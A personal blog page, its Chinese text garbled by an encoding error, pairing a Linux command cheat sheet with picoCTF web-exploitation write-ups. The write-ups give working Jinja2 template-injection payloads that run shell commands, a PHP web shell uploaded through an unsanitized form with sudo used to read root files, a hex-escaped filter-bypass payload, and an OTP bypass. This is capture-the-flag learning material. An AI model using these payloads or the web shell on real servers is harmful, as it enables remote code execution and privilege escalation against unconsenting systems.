title: Linux Commands
content:
ä¸€äº›å¸¸ç”¨çš„ Linux Commandsæ”¾åœ¨é€™è£¡ä»¥é˜²æˆ‘å¿˜è¨˜
# é¡¯ç¤ºç›®å‰æ‰€åœ¨çš„ç›®éŒ„pwd# é¡¯ç¤ºç›®å‰ç™»å…¥çš„ä½¿ç”¨è€…whoami# åˆ—å‡ºç•¶å‰ç›®éŒ„ä¸‹çš„æª”æ¡ˆå’Œè³‡æ–™å¤¾(-l:è©³ç´°ä¿¡æ¯ï¼Œ-a:éš±è—æ–‡ä»¶)ls -la# å»ºç«‹æ–°è³‡æ–™å¤¾ï¼ˆ-p å¯å»ºç«‹å¤šå±¤ç›®éŒ„ï¼‰mkdir -p mydir/subdir# é€²å…¥è³‡æ–™å¤¾cd mydir/subdir# ç§»å‹•æˆ–é‡æ–°å‘½åæª”æ¡ˆï¼ˆ-iï¼šè¦†è“‹å‰æç¤ºï¼‰mv -i old.txt new.txt# è¤‡è£½æª”æ¡ˆï¼ˆ-iï¼šè¦†è“‹å‰æç¤ºï¼Œ-rï¼šéè¿´è¤‡è£½è³‡æ–™å¤¾ï¼‰cp -ir src/ backup/# åˆªé™¤æª”æ¡ˆï¼ˆ-f : å¼·åˆ¶åˆªé™¤æª”æ¡ˆï¼Œ-iï¼šåˆªé™¤å‰æç¤ºï¼Œ-rï¼šéè¿´åˆªé™¤è³‡æ–™å¤¾ï¼‰rm -rf file.txt folder/# ç§»é™¤ç©ºç›®éŒ„ï¼ˆç„¡æ³•åˆªé™¤éç©ºç›®éŒ„ï¼‰rmdir emptydir# æ›´æ”¹æª”æ¡ˆæ¬Šé™ï¼ˆrï¼šè®€å–æ¬Šé™ï¼Œwï¼šå¯«å…¥æ¬Šé™ï¼Œxï¼šåŸ·è¡Œæ¬Šé™ï¼‰chmod +rwx script.sh# å°‹æ‰¾æŒ‡å®šæª”æ¡ˆï¼ˆå¾æ ¹ç›®éŒ„å°‹æ‰¾æ‰€æœ‰ .txt æª”æ¡ˆï¼‰find / -name ".txt"# æ‰“å°æª”æ¡ˆå…§å®¹ï¼ˆå¯æ­é… -n é¡¯ç¤ºè¡Œè™Ÿï¼Œä¹Ÿå¯ç”¨ > åˆä½µå¤šå€‹æ–‡ä»¶ï¼‰cat -n file1.txt file2.txt > combined.txt# ä½¿ç”¨é—œéµå­—éæ¿¾æ–‡å­—å…§å®¹ï¼ˆ-iï¼šå¿½ç•¥å¤§å°å¯«ï¼Œ-nï¼šé¡¯ç¤ºè¡Œè™Ÿï¼Œ-rï¼šéæ­¸æœç´¢å­ç›®éŒ„ï¼‰grep -in 'flag' flag.txt# ä¸‹è¼‰æª”æ¡ˆï¼ˆ-Oï¼šæŒ‡å®šè¼¸å‡ºæª”åï¼‰wget -O index.html https://example.com

title: picoCTF Write up (Web Exploitation)
content:
æ”¾ä¸€äº›æ‰“éçš„é¡Œç›®åœ¨é€™ï¼Œæˆ‘å¾ˆèœåˆ¥å™´æˆ‘
EazySSTI1
Hints
Server Side Template Injection

solve1. Initial Input Reflection
Open the provided URL in a browser.
Enter any random text and click â€œOKâ€.
The input appears reflected in the response â€” indicating potential template rendering.

2. Identifying Template EngineThe challenge name SSTI suggests vulnerability to Server-Side Template Injection, which occurs when user input is rendered by a template engine without proper sanitization.
We test with known payloads to detect the engine :



Engine
Test Payload



Jinja2ï¼ˆFlask/Djangoï¼‰
{{ 7*7 }}


Freemarkerï¼ˆJavaï¼‰
${7*7}


Velocityï¼ˆJavaï¼‰
#set($a = 7*7)${a}


Twigï¼ˆPHPï¼‰
{{ 7*7 }}


Smartyï¼ˆPHPï¼‰
{$7*7}


Makoï¼ˆPythonï¼‰
<% print 7*7 %>


Input :
{{ 5*9 }}
Output: 45 â†’ confirms Jinja2 is in use and SSTI vulnerability is present.
3. Achieving Command ExecutionWe attempt a Command Injection payload using Jinja2 internals :Input :
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
Success â†’ The server responds with the result of the whoami command â€” proving Remote Code Execution (RCE) is possible.
4. Finding the FlagList the files :
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}
The output includes a file named flag.
Final payload to read the flag :
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}


  flags
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_99fe4411}


n0s4n1ty 1
Hints
File upload was not sanitized
Whenever you get a shell on a remote machine, check sudo -l

solve1. Discovering File Upload VulnerabilityUpon accessing the challenge instance, itâ€™s clear that arbitrary files can be uploaded â€” indicating a file upload vulnerability. This allows for malicious script execution on the server.
2. Uploading a PHP Web ShellCreate a simple PHP shell script :
<?phpif(isset($_GET['cmd'])){    echo "<pre>";    $cmd = $_GET['cmd'];  // Get command from the query string    system($cmd);         // Execute the command and display output    echo "</pre>";}?>
Upload this file as webshell.php via the file upload form.
3. Triggering Remote Code Execution (RCE)Access the uploaded shell via:
http://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=whoami
Response â†’ Confirms RCE by displaying the current user.
4. Checking PrivilegesExecute :
http://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=sudo -l
Output:
Matching Defaults entries for www-data on challenge:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser www-data may run the following commands on challenge:    (ALL) NOPASSWD: ALL
This reveals that the current user (www-data) can run any command as any user without a password, including root.
Now you can execute any command as root, for example :
http://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=sudo cat /root/flag.txt

  flags
picoCTF{wh47_c4n_u_d0_wPHP_4043cda3}



head-dump
Hints
Explore backend development with us
The head was dumped.

solve
Exploring the Web ApplicationThe challenge begins on a blog-like website. After launching the instance, I explored the various pages and found an article titled â€œAPI Documentationâ€. Clicking on it redirected me to /api-docs, which opened up Swagger UIâ€”a web interface used for exploring and testing APIs.


Key Discovery: Swagger UI at /api-docs


dentifying the Critical EndpointWithin Swagger, several API endpoints were listed. One stood out:


Endpoint: /heapdump (found under the Diagnosing section)

Its description mentioned memory analysis, which aligned with the challenge title, making it a prime target.

Executing the Endpoint

Using Swaggerâ€™s â€œTry it outâ€ feature, I invoked the /heapdump endpoint. This action generated and downloaded a .heapsnapshot file â€” essentially a memory dump of the server.

File downloaded: heapdump-.heapsnapshot


Extracting the Flag

Memory dump files can be large and overwhelming. Rather than opening it manually, I used a simple command-line tool to scan for the flag format:
cat heapdump-1742808189103.heapsnapshot | grep "picoCTF"

  flags
picoCTF{Pat!3nt_15_Th3_K3y_46022a05}



Cookie Monster Secret Recipe
Hints
Sometimes, the most important information is hidden in plain sight. Have you checked all parts of the webpage?
Cookies arenâ€™t just for eating - theyâ€™re also used in web technologies!
Web browsers often have tools that can help you inspect various aspects of a webpage, including things you canâ€™t see directly.

slove
Accessing the Challenge

Click the link provided in the portal. Youâ€™ll be directed to a Login Page.

Enter any random credentials, e.g., test:test
Click on the Login button

This results in an Access Denied message along with a hint:

ğŸ’¡ â€œHint: Have you checked your cookies lately?â€


Investigating Cookies

Following the hint, open the Cookies tab in your browserâ€™s developer tools.

Youâ€™ll notice a cookie named secret_recipe being setâ€”even though the login failed.


Decoding the CookieJust Copy the value of the secret_recipe cookie and decode as Base64.


  flags
picoCTF{c00k1e_m0nster_l0ves_c00kies_DE7A5E76}


IntroToBurp
Hints
Try using burpsuite to intercept request to capture the flag.
Try mangling the request, maybe their server-side code doesnâ€™t handle malformed requests very well.

solve
Accessing the ChallengeClick the link provided in the portal. Youâ€™ll be directed to a registration page.


Fill in the required registration details and submit.
The site will redirect you to an OTP verification page.


Submitting a Fake OTP


Enter any random OTP like 0000 and click Submit.
The response will say: Invalid OTP.


Capturing the Request with Burp SuiteGo back to the OTP verification page and enter a new OTP again (can be anything).Intercept the request using Burp Suite and Send to Repeater.Delete the  otp=XXXX and Click Send.


  flags
picoCTF{ #0TP_Bypvss_SuCc3$S_c94b61ac}



MediumSSTI2
Hints
Server Side Template Injection
Why is blacklisting characters a bad idea to sanitize input?

solve1. Initial Payload Blocked{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
This is too obvious â†’ modern filters/WAFs block dot access (.), globals, builtins, and keywords like import, os, eval.  
2. Final Bypass Payload :{{request|attr('application')|attr("\x5f\x5fglobals\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}


  flags
picoCTF{sst1_f1lt3r_byp4ss_0ef4bd3d}
